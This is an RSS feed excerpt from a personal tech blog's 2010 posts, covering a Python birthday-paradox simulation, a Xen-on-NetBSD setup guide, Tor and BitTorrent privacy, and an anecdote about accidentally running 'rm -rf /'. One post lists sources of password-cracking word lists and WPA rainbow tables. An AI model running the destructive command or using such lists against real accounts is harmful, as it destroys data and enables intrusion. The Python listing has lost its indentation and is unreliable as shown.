cache_clear_all( <span style="color:#ed9d13">&#39;*&#39;</span>, <span style="color:#ed9d13">&#39;cache_page&#39;</span>, <span style="color:#6ab825;font-weight:bold">TRUE</span> );
<span style="color:#cd2828;font-weight:bold">?&gt;</span>
</code></pre></div><p>It really improves your sites speed! Feel free to adapt the script(s) to your needs.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Its time to say goodbye! RIP 2010-07!</title>
      <link>https://blog.dornea.nu/2010/07/29/its-time-to-say-goodbye-rip-2010-07/</link>
      <pubDate>Thu, 29 Jul 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/07/29/its-time-to-say-goodbye-rip-2010-07/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2010/193/348j3ue.jpg" alt=""></p>
<p><img src="/posts/img/2010/193/swckeu.jpg" alt=""></p>
<p><img src="/posts/img/2010/193/x3ssx0.jpg" alt=""></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Sommersemester 2010 online!</title>
      <link>https://blog.dornea.nu/2010/07/26/sommersemester-2010-online/</link>
      <pubDate>Mon, 26 Jul 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/07/26/sommersemester-2010-online/</guid>
      <content:encoded><![CDATA[<p>Ich habe mir die MÃ¼he gemacht, in meinem Studium fÃƒÂ¼r ein bisschen Ordnung zu sorgen. Ab sofort sind die Vorlesungsmaterialien sowie die Aufgabenzettel (LÃ¶sungen) des letzten Semesters (Sommersemester 2010) <a href="http://git.dornea.nu/studium/tree/master/sose2010">online</a>! Solltet ihr geheime Skripte und Aufgabensammlungen bei euch auf der Festplatte aufbewahren, schreibt mir ne Mail. Vielleicht einigen wir uns zu einem Deal und machen das ganze public.</p>
<p>Ich werde versuchen, den Stuff aus dem ersten Semester so schnell wie mÃ¶glich nachzuliefern. Warum ich <a href="http://git.dornea.nu/studium">das</a> mache? Damit den Erstis die Suche erleichert wird&hellip;</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Java? Without Eclipse? Eclim!</title>
      <link>https://blog.dornea.nu/2010/06/05/java-without-eclipse-eclim/</link>
      <pubDate>Sat, 05 Jun 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/06/05/java-without-eclipse-eclim/</guid>
      <content:encoded><![CDATA[<p>I don&rsquo;t really like bloated IDEs like Netbeans and Eclipse: Too much functionality, so you might get confused and frustrated. I rather use my one and only friend called vim: C, C++, Python, Assembler &hellip; and now Java! What? Yes, it can be a pleasure to code Java in vim. Thanks to <a href="http://eclim.org" title="Eclim">eclim</a> your vim gets Eclipse functionality without starting/using Eclipse. In my opinion vim ist the best editor I&rsquo;ve ever seen. But vim lacks native Java support and some other freatures (great tools for developer productivity) you&rsquo;ll get in Eclipse. And that is where eclim comes into play.</p>
<blockquote>
<p>&ldquo;Instead of trying to write an IDE in Vim  or a Vim editor in Eclipse, eclim provides an Eclipse plug-in that exposes Eclipse features through a server interface, and a set of Vim plug-ins that<br>
communicate with Eclipse over that interface.&rdquo; (Source: <a href="http://eclim.org">http://eclim.org</a>)</p>
</blockquote>
<p>So give it a try and enjoy coding.</p>
<p><img src="/posts/img/2010/164/eclim-screenshot.jpg" alt="Eclim"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Bildungsforschung? Rechtschreibung waere besser</title>
      <link>https://blog.dornea.nu/2010/05/14/bildungsforschung-rechtschreibung-waere-besser/</link>
      <pubDate>Fri, 14 May 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/05/14/bildungsforschung-rechtschreibung-waere-besser/</guid>
      <content:encoded><![CDATA[<p><img src="/posts/img/2010/163/2zgrpe1.jpg" alt="Bildungsforschung"></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Birthday paradox/problem</title>
      <link>https://blog.dornea.nu/2010/05/07/birthday-paradox/problem/</link>
      <pubDate>Fri, 07 May 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/05/07/birthday-paradox/problem/</guid>
      <content:encoded><![CDATA[<p>In probability theory, the birthday problem, or birthday paradox pertains to the probability that in a set of randomly chosen people some pair of them will have the same birthday. In a group of at least 23 randomly chosen people, there is more than 50% probability that some pair of them will have the same birthday. Such a result is counter-intuitive to many.</p>
<p>For 57 or more people, the probability is more than 99%, and it reaches 100% when, ignoring leap-years, the number of people reaches 366 (by the pigeonhole principle). The mathematics behind this problem led to a well-known cryptographic attack called the birthday attack.` [Source: <a href="http://en.wikipedia.org/wiki/Birthday_problem">wikipedia</a>]</p>
<p>Well I tried to show that using empirical methods: I randomly generated groups of <code>persons</code> and calculated the probability that 2 people will have the same birthday. Therefor I&rsquo;ve been using Python due to its simplicity and clean coding style. Here is my code:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">def birthday_paradox():
&#34;&#34;&#34; We calculate the probability that 2 persons will have the same
birthday.
&#34;&#34;&#34;
import random
random.seed()

# How many times should the experiment be conducted
c = 10000

def generate_bdays(t):
&#34;&#34;&#34; We generate t random birthdays between 1 and 365.
Generated birthdays will be returned as a list.
&#34;&#34;&#34;
l = []
for j in range(t):
b_day = random.randint(1,365)
l.append(b_day)

return l

def duplication(l):
&#34;&#34;&#34; Does the list contain any duplication ? &#34;&#34;&#34;
d = {}

# First we create a dictionary:
# [Birthday] -&gt; [Number of occurences]
#
# [Birthday] is in our dictionary key and
# [Number of occurences] the key value
for n in l:
d[n] = d.get(n, 0) + 1

# Check if any key/birthday is duplicated
for c in d.values():
if c &gt; 1: return True

return False

def experiment(n,t):
&#34;&#34;&#34; We create _t_ random birthdays. We do that _n_ times.
Return value:

Number of duplications (if any) / n

&#34;&#34;&#34;
duplikate = 0
for i in range(n):
if duplication(generate_bdays(t)):
duplikate += 1

return duplikate / n

# Here we conduct our experiment
for i in range(50):
print(&#34;Number of persons:&#34;,i, &#34; Probability: &#34;,experiment(c,i))

if __name__ == &#34;__main__&#34;:
birthday_paradox()
</code></pre></div><p>Simple run will show:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ python3.1 birthday_paradox.py
Number of persons: 0 Probability: 0.0
Number of persons: 1 Probability: 0.0
Number of persons: 2 Probability: 0.0023
Number of persons: 3 Probability: 0.0088
Number of persons: 4 Probability: 0.0172
Number of persons: 5 Probability: 0.0246
Number of persons: 6 Probability: 0.0417
Number of persons: 7 Probability: 0.0591
Number of persons: 8 Probability: 0.0709
Number of persons: 9 Probability: 0.0908
Number of persons: 10 Probability: 0.1152
Number of persons: 11 Probability: 0.1421
Number of persons: 12 Probability: 0.1745
Number of persons: 13 Probability: 0.2005
Number of persons: 14 Probability: 0.2318
Number of persons: 15 Probability: 0.2603
Number of persons: 16 Probability: 0.2759
Number of persons: 17 Probability: 0.3205
Number of persons: 18 Probability: 0.3499
Number of persons: 19 Probability: 0.3765
Number of persons: 20 Probability: 0.4118
Number of persons: 21 Probability: 0.4353
Number of persons: 22 Probability: 0.4745
Number of persons: 23 Probability: 0.5078
Number of persons: 24 Probability: 0.5311
Number of persons: 25 Probability: 0.5681
Number of persons: 26 Probability: 0.5978
Number of persons: 27 Probability: 0.6261
Number of persons: 28 Probability: 0.6486
...
</code></pre></div><p>As we, see we need** at least 23 persons** in order to have a <strong>probability greather-equal 50%</strong>.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Torrents over TOR?! Don&#39;t!</title>
      <link>https://blog.dornea.nu/2010/05/03/torrents-over-tor-dont/</link>
      <pubDate>Mon, 03 May 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/05/03/torrents-over-tor-dont/</guid>
      <content:encoded><![CDATA[<blockquote>
<p>&ldquo;An increasing number of people are asking us about the recent paper coming out of Inria in France around Bittorrent and privacy attacks. This post tries to explain the attacks and what they imply. There are three pieces to the attack (or three separate attacks that build on each other, if you prefer).&rdquo;</p>
</blockquote>
<p><em>The first attack is on people who configure their Bittorrent application to proxy their tracker traffic through Tor. These people are hoping to keep their IP address secret from somebody looking over the list of peers at the tracker. The problem is that several popular Bittorrent clients (the authors call out uTorrent in particular, and I think Vuze does it too) just ignore their socks proxy setting in this case. Choosing to ignore the proxy setting is understandable, since modern tracker designs use the UDP protocol for communication, and<br>
socks proxies such as Tor only support the TCP protocol â€” so the developers of these applications had a choice between <code>make it work even when the user sets a proxy that can't be used</code> and <code>make it mysteriously fail and frustrate the user</code>. The result is that the Bittorrent applications made a different security decision than some of their users expected, and now it&rsquo;s biting the users.`</em></p>
<p>[Source: http://blog.torproject.org/blog/bittorrent-over-tor-isnt-good-idea]</p>
<p>Read full article: <a href="http://blog.torproject.org/blog/bittorrent-over-tor-isnt-good-idea">blog.torproject.org</a></p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Word lists/dictionaries compilation</title>
      <link>https://blog.dornea.nu/2010/04/01/word-lists/dictionaries-compilation/</link>
      <pubDate>Thu, 01 Apr 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/04/01/word-lists/dictionaries-compilation/</guid>
      <content:encoded><![CDATA[<p>I&rsquo;ve been following securityfocus.com pen-test mailinglist and found some quite usefull links related to word lists/dictionaries. I&rsquo;ll try to keep the list up2date, so you&rsquo;re submissions are welcome.</p>
<ul>
<li><a href="http://www.skullsecurity.org/wiki/index.php/Passwords">http://www.skullsecurity.org/wiki/index.php/Passwords</a></li>
<li>Kevinâ€™s word lists: <a href="http://wordlist.sourceforge.net/">http://wordlist.sourceforge.net/</a></li>
<li><a href="http://www.phenoelit-us.org/dpl/dpl.html">http://www.phenoelit-us.org/dpl/dpl.html</a>
WPA-PSK Rainbow tables: <a href="http://www.renderlab.net/projects/WPA-tables/">http://www.renderlab.net/projects/WPA-tables/</a></li>
<li>OpenWall word list collection: <a href="http://www.openwall.com/wordlists/">http://www.openwall.com/wordlists/</a></li>
<li><a href="ftp://ftp.ox.ac.uk/pub/wordlists/">ftp://ftp.ox.ac.uk/pub/wordlists/</a></li>
<li><a href="http://www.wordlistgenerator.net/">http://www.wordlistgenerator.net/</a></li>
<li><a href="http://www.outpost9.com/files/WordLists.html">http://www.outpost9.com/files/WordLists.html</a></li>
<li><a href="http://www.vulnerabilityassessment.co.uk/passwords.htm">http://www.vulnerabilityassessment.co.uk/passwords.htm</a></li>
<li><a href="http://packetstormsecurity.org/Crackers/wordlists/">http://packetstormsecurity.org/Crackers/wordlists/</a></li>
<li><a href="http://www.ai.uga.edu/ftplib/natural-language/moby/">http://www.ai.uga.edu/ftplib/natural-language/moby/</a></li>
<li><a href="http://www.cotse.com/tools/wordlists1.htm">http://www.cotse.com/tools/wordlists1.htm</a></li>
<li><a href="http://www.cotse.com/tools/wordlists2.htm">http://www.cotse.com/tools/wordlists2.htm</a></li>
<li><a href="http://torrentz.com/search?q=word+list">http://torrentz.com/search?q=word+list</a></li>
<li><a href="http://www.net-comber.com/wordurls.html">http://www.net-comber.com/wordurls.html</a></li>
<li><a href="http://hashkiller.com/files/downloads/wordlists/">http://hashkiller.com/files/downloads/wordlists/</a></li>
</ul>
]]></content:encoded>
    </item>
    
    <item>
      <title>rm -rf / and some kernel panic</title>
      <link>https://blog.dornea.nu/2010/03/26/rm-rf-/-and-some-kernel-panic/</link>
      <pubDate>Fri, 26 Mar 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/03/26/rm-rf-/-and-some-kernel-panic/</guid>
      <content:encoded><![CDATA[<p>If you ever had in mind to <code>rm -rf /</code>: DON&rsquo;T! Even for its funny aspect, it isn&rsquo;t worth doing such a stupid thing. Well I did it..At least not intentionally. I remember I was going to remove some ordinary directory and then I must have misspelled the last argument (directory name). Luckily I was able to notice the tragedyÂ  and cancel the command by ^C. <code>F\***! What should I now?!</code>, was my first thought. I remembered there was a dir called backups somewhere. Indeed, there was <code>/var/backups</code> but I wasn&rsquo;t able to restore my data completely. And what about <code>/dev</code> ?! I knew I had to reinstall the NetBSD distribution; just to be sure everything is there. So I ran</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ./build.sh -u distribution install=/
</code></pre></div><p>and hoped for the best. Finally the installation was done and I did a fresh reboot. And then it happened: BOOM!</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">...panic: init died (signal 0, exit 12)Stopped in pid 1.1 (init) at netbsd:cpu_Debugger+0x4: bx r14
</code></pre></div><p>(for more details read <a href="http://mail-index.netbsd.org/tech-kern/2009/03/18/msg004607.html">this</a>). At that moment I knew I&rsquo;ve screwed it up. Apparently the init process couldn&rsquo;t create the devices, since there was no MAKEDEV in /dev. I don&rsquo;t have a clue how that happened. So I booted Linux, mounted the UFS partition and looked up for the MAKEDEV file. I found it in <code>/mnt//usr/obj/destdir.amd64/dev</code>. I tried to copy it to <code>/mnt/dev/</code> but then BAM! The partition was mounted read-only. Ok, I ran</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ mount -o rw /mnt
</code></pre></div><p>and the kernel said there was no write support for UFS. My second <code>F\*** YOU!</code> was just about to enter /dev/stdout but then I tried to stay calm and search for the solution. The solution: Recompile Linux kernel with UFS write suppport enabled. I found this <a href="http://ghantoos.org/2009/04/04/mounting-ufs-in-readwrite-under-linux/">short tutorial</a> (BTW: Really great howto!) and was able to enable write support for UFS. I rebooted, mounted the NetBSD partition with write support, copied MAKEDEV into <code>/dev</code> and rebooted again. No kernel panic anymore! I was on cloud nine!</p>
<p>So what did I learned during this adventure?! <strong>Think before you type!</strong> That should apply to all of us.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Create new Debian domU using Xen on *BSD</title>
      <link>https://blog.dornea.nu/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd/</link>
      <pubDate>Mon, 22 Mar 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/03/22/howto-create-new-debian-domu-using-xen-on-bsd/</guid>
      <content:encoded><![CDATA[<p>In this tutorial you&rsquo;ll get detailed information how to setup a fully functionable Debian Lenny system using virtualization software <a href="http://xen.org/">Xen</a>. This entry was written due to high frustration caused by unreliable/outdated articles on the Internet and uncompleted tutorials. This here should be an attempt to describe the installation process completely and provide additional information which might help you solve common problems. The domU system we&rsquo;d like to setup (in our case Debian) provides a neat <a href="http://en.wikipedia.org/wiki/NetBoot">netboot</a> installer which supports Xen. I don&rsquo;t know - I don&rsquo;t really have the time to look it up - if any other Linux distributions have such installer (nor if they support Xen at all) , so this howto might also apply - or not - to any other distribution. The same applies to the dom0 system: On your system shown shell commands might differ (different syntax)Â  as well as described methods (e.g. mount pseudo devices etc.). I used NetBSD 5.0_STABLE (amd64) on my system, so there should be no major differences to other BSD systems. If you use Linux as your host system, then you should seek forward since this paper is aimed to focus on *BSD papers. There are enough (good) tutorials out there you can rely on.</p>
<h2 id="prerequisites">Prerequisites</h2>
<p>At this point you should have a running Xen instance and have booted your dom0 (NetBSD with kernel XEN3_DOM0). You should have sth like this:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ uname -a
NetBSD BlackTiny 5.0_STABLE NetBSD 5.0_STABLE (XEN3_DOM0)
</code></pre></div><p>Some technical details:</p>
<ul>
<li>System: <em>Lenovo Thinkpad x61 / NetBSD 5.0_STABLE (amd64)</em></li>
<li>pkgsrc branch: <em>2009Q4</em></li>
<li>Xen kernel: <em>xenkernel33-3.3.2</em></li>
<li>Xen tools: <em>xentools33-3.3.2nb1</em></li>
<li>Xen dom0 kernel: <em>NetBSD 5.0_STABLE</em></li>
</ul>
<h2 id="step-1-network-configuration">Step 1: Network configuration</h2>
<p>Now you&rsquo;ll have to create a network bridge:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ifconfig bridge0 create
$ ifconfig bridge0
bridge0: flags=0 mtu 1500
</code></pre></div><p>Make sure you use an Intenet connection based on Ethernet (IEEE 802.3) since the Debian installer provides no WiFi modules (?). There have been several problems when using WiFi due to some data encapsulation issues. So be sure you have an active Internet connection based on Ethernet. Now you should add your Ethernet interface (wm0 on my system) to the network bridge we&rsquo;ve created:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ brconfig -a
bridge0: flags=0
        Configuration:
                priority 32768 hellotime 2 fwddelay 15 maxage 20
                ipfilter disabled flags 0x0
        Interfaces:
        Address cache (max cache: 100, timeout: 1200):

$ brconfig bridge0 add wm0 stp wm0 up
$ brconfig bridge0
bridge0: flags=41 UP,RUNNING
        Configuration:
                priority 32768 hellotime 2 fwddelay 15 maxage 20
                ipfilter disabled flags 0x0
        Interfaces:
                wm0 flags=7 LEARNING,DISCOVER,STP
                        port 1 priority 128 path cost 55 listening
        Address cache (max cache: 100, timeout: 1200):
</code></pre></div><p>This whole configuration stuff will be gone after reboot in case you don&rsquo;t save it to some file. If you want your system to automaticallly create the bridge, then you&rsquo;ll have to create <code>/etc/ifconfig.bridge0</code> and add these lines to it:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">create!brconfig $int add [your LAN interface]up
</code></pre></div><p>Be sure to replace <code>[your LAN interface]</code> with the interface identifier on your system (in my case it would be wm0).</p>
<h2 id="create-disk-container">Create disk container</h2>
<p>After setting up the network stuff, you should now create a container (about 2GB) where Debian will be later on installed.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ dd if=/dev/zero of=Debian-Lenny.img bs=1m count=2048
</code></pre></div><h2 id="step-3-get-debian-kernel-and-ramdisk-file">Step 3: Get Debian kernel and ramdisk file</h2>
<p>In order to have a fully functionable Debian installation <strong>DON&rsquo;T</strong> use <a href="http://people.debian.org/%7Ejoeyh/d-i/images/daily/">these</a> files. You&rsquo;ll run into several problems which will keep you busy searching the Internet for the solutions. Instead you should use the i386-current Xen netboot installer from this<a href="ftp://ftp.debian.org/debian/dists/lenny/main/installer-i386/current/images/netboot/xen/"> link</a>. You should at least download:</p>
<ul>
<li>the kernel file (<a href="ftp://ftp.debian.org/debian/dists/lenny/main/installer-i386/current/images/netboot/xen/vmlinuz">vmlinuz</a>)</li>
<li>the ramdisk file (<a href="ftp://ftp.debian.org/debian/dists/lenny/main/installer-i386/current/images/netboot/xen/initrd.gz">initrd.gz</a>)</li>
</ul>
<p>to your local directory.</p>
<h2 id="step-4-xen-domu-configuration">Step 4: Xen domU configuration</h2>
<p>Now let us configure then Xen domU at least with these options (see xm-debian.cfg):</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Initial memory allocation (in megabytes) for the new domain.
memory = 128

# A name for your domain. All domains must have different names.
name = &#34;debianinstall&#34;

# Define network interfaces
vif = [&#39;bridge=bridge0&#39;]
...
</code></pre></div><h2 id="step-5-start-xen-services">Step 5: Start Xen services</h2>
<p>First be sure you have following entries in your <code>/etc/rc.conf</code>:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">xend=YES
xendomains=YES
xenbackendd=YES
</code></pre></div><p>Additionally you can add:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">xendomains=&#34;domain.foo domain.bar&#34;
</code></pre></div><p>whereÂ <code>domain.foo</code> and <code>domain.bar</code> are your Xen configs for these domains,<br>
i.e $LOCALBASE/etc/xen/domain.foo.In my case $LOCALBASE is defined as /usr/pkg.This will bring Xen to automatically start your DomUs. (thanks Marcin M. Jessa for this hint)</p>
<p>Then you should be able to start Xen services:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ /usr/pkg/share/examples/rc.d/xend start
$ /usr/pkg/share/examples/rc.d/xenbackendd start
$ /usr/pkg/share/examples/rc.d/xendomains start
</code></pre></div><h2 id="step-6-install-debian">Step 6: Install Debian</h2>
<p>Now you should be able to start the Debian installation process.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -l
-rw-r--r--  1 root  wheel  13796958 Mar  3 18:13 initrd.gz
-rw-r--r--  1 root  wheel   1548496 Mar  3 18:13 vmlinuz
-rw-r--r--  1 root  wheel      7733 Mar 21 18:46 xm-debian.cfg

$ $ sha1 vmlinuz 
SHA1 (vmlinuz) = becfb0b127c083b1444f896011564b1822423152
$ sha1 initrd.gz 
SHA1 (initrd.gz) = 11bc2711f08ed8a0863169c506ab88d69cf9f3cf
</code></pre></div><p>You should now launch your Xen domU:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ xm create xm-debian.cfg install=true install-kernel=./vmlinuz install-ramdisk=./initrd.gz
</code></pre></div><p>Since we use no framebuffer you should now switch to your console (by pressing CTRL+ALT + Fx, where X = 1 .. 8), login as root, cd to the previously listed directory and type:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ xm console debianinstall
</code></pre></div><p>You should now have an attached console to Debian&rsquo;s installer.</p>
<p><img src="/posts/img/2010/147/11ae9eb.jpg" alt="debian installer"></p>
<p>The Debian installer should also configure network automatically by DHCP.</p>
<p><img src="/posts/img/2010/147/2rdyl2g.jpg" alt="DHCP"></p>
<p>If this fails, then you should go back to the main installer menu and <strong>Execute a shell</strong>. Afterwards run <code>dhclient eth0</code> as shown below:</p>
<p><img src="/posts/img/2010/147/5oz5zn.jpg" alt="DHCP"></p>
<p><img src="/posts/img/2010/147/2d9r3it.jpg" alt="Configure network manually"></p>
<p>Then proceed with the installation process&hellip;</p>
<p><img src="/posts/img/2010/147/29mklm1.jpg" alt="Successful network setup"></p>
<p>Attention: When configuring the virtual disk, have in mind that you should format your disk as ext2 and <strong>not as ext3</strong>. Ext3 is currently not supported by NetBSD. When you have reached the partitioning step, select the partition marked as ext3, press enter and change afterwards the file system type to ext2. Then you should select <code>Done setting up the partition</code> and press enter.</p>
<p><img src="/posts/img/2010/147/m79cgk.jpg" alt="Ext3fs"></p>
<p>You should now go through the installation process without experiencing any troubles. At the end of the installation you won&rsquo;t have to install grub nor any boot loader, so simply ignore the error messages and select <code>Continue</code>. Even if you should go back to the main installation menu, select <code>Continue without any boot loader</code> and everything will be alright.</p>
<h2 id="step-7-start-your-fresh-new-debian-system">Step 7: Start your fresh new Debian system</h2>
<p>First you&rsquo;ll have to extract <code>vmlinuz</code> and <code>initrd.gz</code> from your local disk container. NetBSD provides vnconfig(8) to configure pseudo disk devices.</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ vnconfig vnd0 Debian-Lenny.img
$ disklabel /dev/vnd0
# /dev/vnd0d:
type: vnd
disk: vnd
label: fictitious
flags:
bytes/sector: 512
sectors/track: 32
tracks/cylinder: 64
sectors/cylinder: 2048
cylinders: 1024
total sectors: 2097152
rpm: 3600
interleave: 1
trackskew: 0
cylinderskew: 0
headswitch: 0 # microseconds
track-to-track seek: 0 # microseconds
drivedata: 0

9 partitions:
# size offset fstype [fsize bsize cpg/sgs]
d: 2097152 0 unused 0 0 # (Cyl. 0 - 1023)
e: 1863477 63 Linux Ext2 0 0 # (Cyl. 0*- 909*)
i: 224847 1863603 swap # (Cyl. 909*- 1019*)
disklabel: boot block size 0
disklabel: super block size 0
</code></pre></div><p>As expected we have a swap partition and a ext2 (!!!) file system. We&rsquo;ll try now to mount it in order to extract the previously mentioned files:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ mount -t ext2fs /dev/vnd0e /mnt
$ file /mnt/vmlinuz /mnt/vmlinuz: symbolic link to `boot/vmlinuz-2.6.26-2-686-bigmem&#39;
$ file /mnt/initrd.img /mnt/initrd.img: symbolic link to `boot/initrd.img-2.6.26-2-686-bigmem&#39;
</code></pre></div><p>Now all you&rsquo;ll have to do is to copy these files to your local partition and use them in your domU configuration. On my laptop I&rsquo;ve created /home/xen:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ ls -lR total 16
drwxr-xr-x 2 root wheel 512 Mar 22 17:04 conf
drwxr-xr-x 2 root wheel 512 Mar 6 22:07 container
drwxr-xr-x 2 root wheel 512 Mar 6 22:08 kernel
drwxr-xr-x 2 root wheel 512 Mar 6 22:06 ramdisk

./conf:
total 32
-rw-r--r-- 1 root wheel 2676 Mar 6 22:08 Debian-Lenny.conf

./container:
total 4195360
-rw-r--r-- 1 root users 2147483648 Mar 6 21:38 Debian-Lenny.img

./kernel:
total 3072
-rw-r--r-- 1 root wheel 1548304 Mar 5 18:03 Debian-Lenny-vmlinuz-2.6.26-2-686-bigmem

./ramdisk:
total 12192
-rw-r--r-- 1 root wheel 6214259 Mar 5 18:03 Debian-Lenny-initrd.img-2.6.26-2-686-bigmem
</code></pre></div><p>Debian-Lenny.conf in *conf *contains:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback"># Kernel image file. This kernel will be loaded in the new domain.
kernel = &#34;/home/xen/kernel/Debian-Lenny-vmlinuz-2.6.26-2-686-bigmem&#34;
ramdisk = &#34;/home/xen/ramdisk/Debian-Lenny-initrd.img-2.6.26-2-686-bigmem&#34;

# Memory allocation (in megabytes) for the new domain.
memory = 156

# A handy name for your new domain. This will appear in &#39;xm list&#39;,
# and you can use this as parameters for xm in place of the domain
# number. All domains must have different names.

name = &#34;Debian-Lenny&#34;
vif = [ &#39;mac=00:16:3e:2e:32:5f, bridge=bridge0&#39; ]

disk = [ &#39;file:/home/xen/container/Debian-Lenny.img,xvda,w&#39;]

# Set root device.
root = &#34;/dev/xvda&#34;
</code></pre></div><p>Now for the final step, launch your Debian domU using:</p>
<div class="highlight"><pre tabindex="0" style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-fallback" data-lang="fallback">$ cd conf
$ pwd/home/xen/conf
$ xen create -c Debian-Lenny.conf
</code></pre></div><p>Thats it! I hope you enjoyed this HowTo and if you have any questions/unsolved issues, just drop me a mail and I&rsquo;ll try to help.</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>Inside the mind of a Russian hacker</title>
      <link>https://blog.dornea.nu/2010/03/11/inside-the-mind-of-a-russian-hacker/</link>
      <pubDate>Thu, 11 Mar 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/03/11/inside-the-mind-of-a-russian-hacker/</guid>
      <content:encoded><![CDATA[<blockquote>
<p>&ldquo;It&rsquo;s like when you have a maths problemÂ  he said. You&rsquo;ll have to find the right tools otherwise you&rsquo;re lost. If you&rsquo;re able to understand the problem, then `use that knowledge in the future.&rdquo;</p>
</blockquote>
<p>This simple comparison applies to hacking, at least to that one that is used to be practiced in Russia. Even Mr. Kaspersky admits that most sophisticated attacks have their origin in his own country. Russian hacking attacks seem to be more <code>professional</code>, the malware design more <code>complicated and technical</code>. Is Russia going to form their cyber-specialists to ruthless and money greedy cyber-gangsters? <a href="http://news.bbc.co.uk/2/hi/technology/8561910.stm">BBC News</a> provides a very informative interview of young men who pretends to belong to the so called <code>new generation</code> of cyber-specialists in Russia.[Source: BBC <a href="http://news.bbc.co.uk/2/hi/technology/8561910.stm">News</a>]</p>
]]></content:encoded>
    </item>
    
    <item>
      <title>HowTo: Qemu networking on NetBSD</title>
      <link>https://blog.dornea.nu/2010/03/01/howto-qemu-networking-on-netbsd/</link>
      <pubDate>Mon, 01 Mar 2010 00:00:00 +0000</pubDate>
      
      <guid>https://blog.dornea.nu/2010/03/01/howto-qemu-networking-on-netbsd/</guid>
